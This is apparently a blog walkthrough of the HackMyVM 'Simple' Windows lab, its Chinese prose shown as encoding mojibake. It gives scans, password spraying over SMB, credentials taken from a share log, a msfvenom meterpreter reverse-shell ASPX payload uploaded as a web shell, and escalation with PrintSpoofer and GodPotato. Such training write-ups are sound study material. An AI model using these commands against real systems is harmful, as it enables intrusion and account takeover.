---
title: Simple
author: hgbe02
date: 2024-04-08
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Simple.html"
---

# Simple

å¥½åƒæ˜¯windowsçš„é¶åœºï¼Œä»Šå¤©è¯•è¯•ï¼

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007891.png" alt="image-20240408121116109" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007893.png" alt="image-20240408121227696" style="zoom: 50%;" />

## ä¿¡æ¯æœé›†

### ç«¯å£æ‰«æ

```bash
nmap -sCV -p 1-65535 172.20.10.4
```

```css
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Simple
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-08T04:20:40
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 2s
|_nbstat: NetBIOS name: SIMPLE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:b7:b6:07 (Oracle VirtualBox virtual NIC)	
```

### ç›®å½•æ‰«æ

```css
feroxbuster -u http://172.20.10.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 2 -s 200 301 302
```

```css
301      GET        2l       10w      160c http://172.20.10.4/images => http://172.20.10.4/images/
200      GET       60l      128w     1369c http://172.20.10.4/03-comming-soon/css/responsive.css
200      GET      134l      438w     3905c http://172.20.10.4/03-comming-soon/css/styles.css
200      GET       50l       96w     1481c http://172.20.10.4/
301      GET        2l       10w      160c http://172.20.10.4/Images => http://172.20.10.4/Images/
301      GET        2l       10w      159c http://172.20.10.4/fonts => http://172.20.10.4/fonts/
301      GET        2l       10w      160c http://172.20.10.4/IMAGES => http://172.20.10.4/IMAGES/
301      GET        2l       10w      159c http://172.20.10.4/Fonts => http://172.20.10.4/Fonts/
```

æ‰«ææ—¶é—´è¿‡é•¿ï¼Œä¸ç”¨ç­‰ï¼Œå¯¹æµ‹è¯•æ²¡å•¥å¤§ç”¨å¤„ã€‚

### æ¼æ´æ‰«æ

```bash
nikto -h http://172.20.10.4
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.20.10.4
+ Target Hostname:    172.20.10.4
+ Target Port:        80
+ Start Time:         2024-04-08 00:22:12 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: Retrieved x-powered-by header: ASP.NET.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /LaQsQxLy.asmx: Retrieved x-aspnet-version header: 4.0.30319.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2024-04-08 00:23:11 (GMT-4) (59 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## æ¼æ´åˆ©ç”¨

### è¸©ç‚¹

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007894.png" alt="image-20240408121938073" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007895.png" alt="image-20240408122017494" style="zoom:50%;" />

éšæ‰‹æŸ¥çœ‹ä¸€ä¸‹æ¼æ´ï¼Œæ²¡å•¥å‘ç°ï¼Œç»§ç»­çœ‹ä¸€ä¸‹æºä»£ç ï¼Œä¹Ÿæ²¡å•¥å‘ç°ï¼š

æåˆ°äº†å‡ ä¸ªåå­—å°è¯•è®°å½•ä¸€ä¸‹ï¼š

```apl
# user.txt
echo "ruy\nmarcos\nlander\nbogo\nvaiper" > user.txt
```

### æ•æ„Ÿç«¯å£

#### SMBæœåŠ¡

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~]
â””â”€$ enum4linux 172.20.10.4 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Apr  8 00:31:02 2024
 =========================================( Target Information )=========================================
Target ........... 172.20.10.4
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 ============================( Enumerating Workgroup/Domain on 172.20.10.4 )============================
[+] Got domain/workgroup name: WORKGROUP
 ================================( Nbtstat Information for 172.20.10.4 )================================
Looking up status of 172.20.10.4
        SIMPLE          <20> -         B <ACTIVE>  File Server Service
        SIMPLE          <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

        MAC Address = 08-00-27-B7-B6-07
 ====================================( Session Check on 172.20.10.4 )====================================
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

â”Œâ”€â”€(kaliğŸ’€kali)-[~]
â””â”€$ smbmap -H 172.20.10.4                                     

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)                                

â”Œâ”€â”€(kaliğŸ’€kali)-[~]
â””â”€$ smbclient //172.20.10.4/share                             
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

å¯æƒœæ²¡å•¥æ”¶è·ã€‚ã€‚ã€‚çˆ†ç ´ä¸€ä¸‹ï¼Ÿæƒ³èµ·æ¥äº†ç»¿å¸ˆå‚…çš„é‚£ä¸ªå·¥å…·ï¼Œæ˜¨å¤©åšzurrakç”¨åˆ°çš„ï¼š

```bash
crackmapexec smb 172.20.10.4 -u user.txt -p user.txt
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007896.png" alt="image-20240408123531119" style="zoom:50%;" />

ä¼¼ä¹é˜”ä»¥è¯•è¯•ï¼Ÿ

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Simple]
â””â”€$ smbclient //172.20.10.4/share -U bogo
Password for [WORKGROUP\bogo]:
session setup failed: NT_STATUS_PASSWORD_EXPIRED
```

æ¢ä¸€ä¸‹ï¼š

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Simple]
â””â”€$ smbclient -L //172.20.10.4/ -U bogo
Password for [WORKGROUP\bogo]:
session setup failed: NT_STATUS_PASSWORD_EXPIRED
```

ä¸è¡Œå“ªé‡Œå¼„é”™äº†ï¼Œè¿˜å¾—é‡æ–°æ¢æŸ¥ä¸€ä¸‹ï¼Œç½‘ä¸Šæœè¿™ç§æŠ¥é”™ä¹Ÿå¾ˆå°‘ï¼Œæˆ‘é‡å¯ä¸€ä¸‹é¶æœºè¯•è¯•ï¼Œè¿˜æ˜¯ä¼šå­˜åœ¨ä¸€æ ·çš„æŠ¥é”™ï¼Œç„¶åä¸Šç½‘æ‰¾åˆ°äº†è¿™ä¸ª

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007897.png" alt="image-20240408125920735" style="zoom:50%;" />

æ‰¾aié—®ä¸€ä¸‹ï¼Œå‘ç°ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007898.png" alt="image-20240408130120232" style="zoom:50%;" />

ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿwtfï¼

æˆ‘è¿™é‡Œç›´æ¥è·³äº†ï¼š

```css
smbclient -L //172.20.10.4/ -U bogo
Password for [WORKGROUP\bogo]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Admin remota
	C$              Disk      Recurso predeterminado
	IPC$            IPC       IPC remota
	LOGS            Disk      
	WEB             Disk      
```

ç„¶åå¾—åˆ°`LOGS`ï¼Œå°è¯•è¿›è¡Œä¸‹ä¸€æ­¥ï¼š

```
smbclient //172.20.10.4/LOGS/ -U bogo
Password for [WORKGROUP\bogo]:
Try "help" to get a list of possible commands.
smb: \> ls
           
  20231008.log               

smb: \> get 20231008.log 
```

```bash
cat 20231008.log
PS C:\> dir \\127.0.0.1\WEB
Acceso denegado
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\127.0.0.1\WEB:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Cannot find path '\\127.0.0.1\WEB' because it does not exist.
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

PS C:\> net use \\127.0.0.1\WEB
Se ha completado el comando correctamente.

PS C:\> dir \\127.0.0.1\WEB
Acceso denegado
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\127.0.0.1\WEB:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Cannot find path '\\127.0.0.1\WEB' because it does not exist.
At line:1 char:1
+ dir \\127.0.0.1\WEB
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

PS C:\> net use \\127.0.0.1\WEB /user:marcos SuperPassword
Se ha completado el comando correctamente.

PS C:\> dir \\127.0.0.1\WEB

    Directorio: \\127.0.0.1\WEB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2023   9:46 PM                aspnet_client
-a----        9/26/2023   6:46 PM            703 iisstart.htm
-a----        10/8/2023  10:46 PM            158 test.php

PS C:\> rm \\127.0.0.1\WEB\*.php

PS C:\> dir \\127.0.0.1\WEB

    Directorio: \\127.0.0.1\WEB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2023   9:46 PM                aspnet_client
-a----        9/26/2023   6:46 PM            703 iisstart.htm

PS C:\> 
```

è¯´æ˜æ‰¾åˆ°äº†`WEB`ç›®å½•ï¼Œä»¥åŠè´¦å·å¯†ç ï¼š`user:marcos SuperPassword`

åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œæˆ‘éƒ½åšä¸äº†ï¼Œä¸‹é¢æˆ‘æ¥ç€åœ¨æœ¬æœºä¸Šè¿›è¡Œæ“ä½œä¸€ä¸‹å“ˆï¼š

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/temp/Simple]
â””â”€# smbclient //172.20.10.4/WEB/ -U marcos
Password for [WORKGROUP\marcos]:
session setup failed: NT_STATUS_PASSWORD_EXPIRED
```

å½“æˆ‘æ²¡è¯´ã€‚ã€‚ã€‚ã€‚é€€ä¸€æ­¥è¶Šæƒ³è¶Šæ°”ï¼Œå°è¯•èƒ½ä¸èƒ½è¿›å…¥ç³»ç»Ÿä¿®æ”¹ä¸€ä¸‹ï¼š

### è§£å†³bug

ç‚¹å‡»å³è¾¹çš„é‚£ä¸ª`ctrl+del`:

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007899.png" alt="image-20240408132023596" style="zoom: 80%;" />

æŒ‰`esc`è¿›å…¥ç”¨æˆ·åˆ—è¡¨ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007900.png" alt="image-20240408132513088" style="zoom: 67%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007901.png" alt="image-20240408132539336" style="zoom: 80%;" />

ç„¶åå¯„äº†ï¼Œè¿™ä»¨å¯†ç æˆ‘ä»¬ä¸€ä¸ªéƒ½ä¸çŸ¥é“ã€‚ã€‚ã€‚æˆ‘é€‰äº†bogoç„¶åç…§ç€é¡µé¢ï¼ŒæŒ‰äº†å•¥`esc`å•¥çš„ï¼Œç„¶åè¾“å…¥çš„åœ°æ–¹å…¨é€‰äº†`bogo`ï¼Œç„¶åè«åå¥‡å¦™è¿›æ¥äº†ã€‚ã€‚

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007902.png" alt="image-20240408132800063" style="zoom:50%;" />

ä¸è¦æ…Œï¼Œä¸‹é¢è¿˜è¦æ”¹ä¸€ä¸ªï¼Œæˆ‘ä¸‹é¢å†æˆªå›¾ï¼š

å†æ‰«ä¸€ä¸‹è¯•è¯•ï¼š

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/temp/Simple]
â””â”€# smbclient -L //172.20.10.4/ -U bogo
Password for [WORKGROUP\bogo]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        LOGS            Disk      
        WEB             Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.20.10.4 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007903.png" alt="image-20240408133114607" style="zoom:50%;" />

æˆ‘å‰é¢å¯æ²¡æŠ„å—·ï¼è¯»ä¹¦äººçš„äº‹æ€ä¹ˆèƒ½å«æŠ„å‘¢ã€‚

æˆ‘çœŸtmç‰›é€¼ï¼Œå†æ”¹ä¸€ä¸‹å¦ä¸€ä¸ªï¼Œè¿™æ¬¡æˆ‘ä¸€æ­¥ä¸€æˆªå›¾ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007904.png" alt="image-20240408133344847" style="zoom:50%;" />

#### ç¬¬ä¸€æ­¥

å…ˆæŒ‰`ç©ºæ ¼å³è¾¹çš„ctrl+del`

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007905.png" alt="image-20240408133402185" style="zoom:50%;" />

#### ç¬¬äºŒæ­¥

æŒ‰`esc`ä¸¤æ¬¡ï¼Œç•Œé¢å˜äº†å°±ä¸ç”¨æŒ‰äº†ï¼Œä¸€ç›´æ²¡å˜çš„è¯ç‚¹å‡»ä¸€ä¸‹é‚£ä¸ªå±å¹•å†æŒ‰

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007906.png" alt="image-20240408133503536" style="zoom:50%;" />

å†æŒ‰`esc`:

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007907.png" alt="image-20240408133533133" style="zoom:50%;" />

#### ç¬¬ä¸‰æ­¥

æˆ‘ä»¬è¦æ”¹ç¬¬ä¸‰ä¸ªå°è¯•ä½¿ç”¨`tab`åˆ°é‚£é‡Œï¼Œç„¶åå…ˆ`esc`å†`enter`

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007908.png" alt="image-20240408133643795" style="zoom:50%;" />

è¾“å…¥å¯†ç ï¼š`SuperPassword`ï¼Œç„¶åå…ˆ`esc`å†`enter`ï¼

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007910.png" alt="image-20240408133843912" style="zoom:50%;" />

è€æ ·å­`esc` +`enter`ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007911.png" alt="image-20240408133916989" style="zoom: 50%;" />

å…¨éƒ¨è¾“å…¥`SuperPassword`ï¼Œè¾“å…¥å®Œä¸€è¡Œ`tab`ä¸€ä¸‹ï¼Œæœ€å`enter`ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007912.png" alt="image-20240408133916989" style="zoom: 50%;" />

é¢ï¼Œéš¾é“å†™é”™äº†ï¼Ÿå†`esc + enter`ä¸€ä¸‹ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007913.png" alt="image-20240408134312732" style="zoom:50%;" />

è¿™ä¸‹å¯¹èƒƒäº†ï¼`esc+enter`å°è¯•ä¸€ä¸‹èƒ½å¦çœ‹åˆ°ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007914.png" alt="image-20240408134521411" style="zoom:50%;" />

okäº†ï¼é˜”ä»¥ç»§ç»­åšäº†ï¼

### ç»§ç»­SMB

æ ¹æ®æå–åˆ°çš„ä¿¡æ¯è¿›è¡Œæ“ä½œï¼š

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/temp/Simple]
â””â”€# smbclient -L //172.20.10.4/WEB -U marcos
Password for [WORKGROUP\marcos]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        LOGS            Disk      
        WEB             Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.20.10.4 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                            
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/temp/Simple]
â””â”€# smbclient //172.20.10.4/WEB -U marcos 
Password for [WORKGROUP\marcos]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Oct  8 11:14:24 2023
  ..                                  D        0  Sun Oct  8 11:14:24 2023
  03-comming-soon                     D        0  Sun Oct  8 17:22:15 2023
  aspnet_client                       D        0  Sun Oct  8 15:46:18 2023
  common-js                           D        0  Sun Oct  8 17:14:09 2023
  fonts                               D        0  Sun Oct  8 17:14:09 2023
  images                              D        0  Sun Oct  8 17:14:09 2023
  index.html                          A     1481  Sun Oct  8 17:26:47 2023

                12966143 blocks of size 4096. 11127775 blocks available
smb: \>
```

å¯ä»¥çœ‹åˆ°æ˜¯æˆ‘ä»¬çš„webç›®å½•äº†ï¼Œå°è¯•ä¸Šä¼ webshellè¿›è¡Œè®¿é—®ï¼Œå› ä¸ºæ˜¯IISæœåŠ¡å™¨ï¼Œå°è¯•ä¸Šä¼ ASPXæˆ–è€…ASPçš„webshellï¼é˜”ä»¥ä½¿ç”¨kaliè‡ªå¸¦çš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨msfç”Ÿæˆä¸€ä¸ªï¼

æˆ‘ä»¬å‚è€ƒ[hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom#reverse-shell-4)å¤‡å¿˜å½•ç”Ÿæˆä¸€ä¸ªï¼š

![image-20240408140236795](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007915.png)

```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/temp/Simple]
â””â”€# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.20.10.8 LPORT=1234 -f asp >reverse.asp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 37996 bytes

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/temp/Simple]
â””â”€# ls              
20231008.log  reverse.asp  user.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/temp/Simple]
â””â”€# smbclient //172.20.10.4/WEB -U marcos 
Password for [WORKGROUP\marcos]:
Try "help" to get a list of possible commands.
smb: \> put reverse.asp 
putting file reverse.asp as \reverse.asp (340.4 kb/s) (average 340.4 kb/s)
```

æœ¬åœ°è®¾ç½®ç›‘å¬ä»¥åï¼Œè®¿é—®è¿›è¡Œæ¿€æ´»ï¼

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007916.png" alt="image-20240408140621335" style="zoom:50%;" />

shellä¹Ÿæ²¡æœ‰å¼¹å›æ¥ã€‚ã€‚ã€‚ã€‚

è¯•è¯•aspxï¼Œå¿˜äº†ç‰ˆæœ¬æ¯”è¾ƒæ–°äº†ï¼Œä¼°è®¡æ˜¯aspxã€‚ã€‚ã€‚

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007917.png" alt="image-20240408141121346" style="zoom:50%;" />

é˜”ä»¥è®¿é—®äº†ï¼Œä½†æ˜¯æ²¡æœ‰å¼¹å›æ¥ï¼Ÿï¼Ÿï¼Ÿ

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007918.png" alt="image-20240408141141514" style="zoom:50%;" />

ä»ç½‘ä¸Šæ‰¾äº†ä¸€ä¸ªå†è¯•ä¸€ä¸‹ï¼Œä¸è¡Œçš„è¯å†æƒ³åˆ«çš„æ–¹æ³•ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007919.png" alt="image-20240408141238201" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007920.png" alt="image-20240408141621840" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007921.png" alt="image-20240408141542823" style="zoom: 50%;" />

å°è¯•è®¿é—®ä¸€ä¸‹ï¼Œä¸è¡Œå¾—å¦æƒ³åˆ«çš„æ–¹æ³•äº†ã€‚ã€‚ã€‚ã€‚

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007922.png" alt="image-20240408141831254" style="zoom:50%;" />

é¢ï¼Œè¡Œå§ã€‚ã€‚ã€‚å†æ‰¾ä¸€ä¸‹ï¼Œå…ˆè¯•æ¢ä¸€ä¸‹aspxåˆ°åº•å¯ä¸å¯ä»¥ä¼ å§ï¼š

```aspx
<%@ Page Language="C#" AutoEventWireup="true"   Inherits="System.Web.UI.Page" %>
<%@ Import Namespace="System" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        Response.Write(Hello());
    }
    private string Hello()
    {
        return "Hello World";
    }
</script>
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007923.png" alt="image-20240408145615633" style="zoom:50%;" />

é¢ï¼ŒåŸæ¥æ˜¯æ‰§è¡Œä¸äº†å•Šï¼Œè¡Œå§ï¼Œå¥½å°´å°¬ï¼Œå“ˆå“ˆå“ˆ

æˆ‘ä»¬ç›´æ¥ä½¿ç”¨é‚£ä¸ªWindowsè¿›è¡Œå§ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007924.png" alt="image-20240408150047989" style="zoom:50%;" />

```apl
SIMPLE{ASPXT0SH311}
```

è¿™æ˜¯å•¥æ„æ€ï¼Ÿé‡å¯é¶æœºå†è¯•ä¸€æ¬¡aspxï¼

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007925.png" alt="image-20240408150654622" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007926.png" alt="image-20240408150931845" style="zoom:33%;" />

å¼¹å›æ¥äº†ï¼Œæ·¦ï¼

## ææƒ

### ä¿¡æ¯æœé›†

å‚è€ƒhttps://fuzzysecurity.com/tutorials/16.htmlä»¥åŠhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalationè¿›è¡Œä¿¡æ¯æœé›†ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007927.png" alt="image-20240408152027719" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007928.png" alt="image-20240408152104096" style="zoom:50%;" />

å°è¯•githubæŒ¨ä¸ªæœç´¢ä¸€ä¸‹ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007929.png" alt="image-20240408152259491" style="zoom:50%;" />

æŒ‰ç…§è¿™ç¯‡blogè¯´çš„æ“ä½œhttps://medium.com/@anandnikhil33/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070

ä½¿ç”¨smbæœåŠ¡å™¨è¿›è¡Œä¸Šä¼ ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007930.png" alt="image-20240408194502581" style="zoom:50%;" />

```css
PS C:\inetpub> cd wwwroot
cd wwwroot
PS C:\inetpub\wwwroot> ls
ls


    Directorio: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       08/10/2023     23:22                03-comming-soon                                                       
d-----       08/10/2023     21:46                aspnet_client                                                         
d-----       08/10/2023     23:14                common-js                                                             
d-----       08/10/2023     23:14                fonts                                                                 
d-----       08/10/2023     23:14                images                                                                
-a----       08/04/2024      8:55            320 hello.aspx                                                            
-a----       08/10/2023     23:26           1481 index.html                                                            
-a----       08/04/2024      9:05          15970 reverse.aspx                                                          


PS C:\inetpub\wwwroot> ls
ls


    Directorio: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       08/10/2023     23:22                03-comming-soon                                                       
d-----       08/10/2023     21:46                aspnet_client                                                         
d-----       08/10/2023     23:14                common-js                                                             
d-----       08/10/2023     23:14                fonts                                                                 
d-----       08/10/2023     23:14                images                                                                
-a----       08/04/2024      8:55            320 hello.aspx                                                            
-a----       08/10/2023     23:26           1481 index.html                                                            
-a----       08/04/2024     13:42          27136 PrintSpoofer.exe                                                      
-a----       08/04/2024      9:05          15970 reverse.aspx                                                          


PS C:\inetpub\wwwroot> ./PrintSpoofer.exe -i -c cmd
./PrintSpoofer.exe -i -c cmd
PS C:\inetpub\wwwroot> whoami
whoami
iis apppool\defaultapppool
PS C:\inetpub\wwwroot> cmd
cmd
Microsoft Windows [Versiï¿½n 10.0.17763.107]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\inetpub\wwwroot>ls
ls
"ls" no se reconoce como un comando interno o externo,
programa o archivo por lotes ejecutable.

C:\inetpub\wwwroot>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El nï¿½mero de serie del volumen es: 26CD-AE41

 Directorio de C:\inetpub\wwwroot

08/04/2024  13:42    <DIR>          .
08/04/2024  13:42    <DIR>          ..
08/10/2023  23:22    <DIR>          03-comming-soon
08/10/2023  21:46    <DIR>          aspnet_client
08/10/2023  23:14    <DIR>          common-js
08/10/2023  23:14    <DIR>          fonts
08/04/2024  08:55               320 hello.aspx
08/10/2023  23:14    <DIR>          images
08/10/2023  23:26             1.481 index.html
08/04/2024  13:42            27.136 PrintSpoofer.exe
08/04/2024  09:05            15.970 reverse.aspx
               4 archivos         44.907 bytes
               7 dirs  45.572.870.144 bytes libres

C:\inetpub\wwwroot>PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -i -c cmd.exe
```

ä½†æ˜¯æ²¡å•¥ç”¨å¤„ï¼Œå°è¯•æ¢ä¸€ä¸ªå·¥å…·[GodPotato](https://github.com/BeichenDream/GodPotato)ï¼š

> æœ‰å¤šä¸ªç‰ˆæœ¬çš„ï¼Œæˆ‘è¯•äº†ä¸€ä¸ª2å’Œ4å°±å‡ºæ¥äº†ï¼Œå¦‚æœéƒ½ä¸è¡Œçš„è¯æˆ‘æœªå¿…ä¼šè¯•ä¸€ä¸‹3ï¼Œå“ˆå“ˆå“ˆ

![image-20240408195320225](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404082007931.png)

```css
C:\inetpub\wwwroot>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El nï¿½mero de serie del volumen es: 26CD-AE41

 Directorio de C:\inetpub\wwwroot

08/04/2024  13:42    <DIR>          .
08/04/2024  13:42    <DIR>          ..
08/10/2023  23:22    <DIR>          03-comming-soon
08/10/2023  21:46    <DIR>          aspnet_client
08/10/2023  23:14    <DIR>          common-js
08/10/2023  23:14    <DIR>          fonts
08/04/2024  08:55               320 hello.aspx
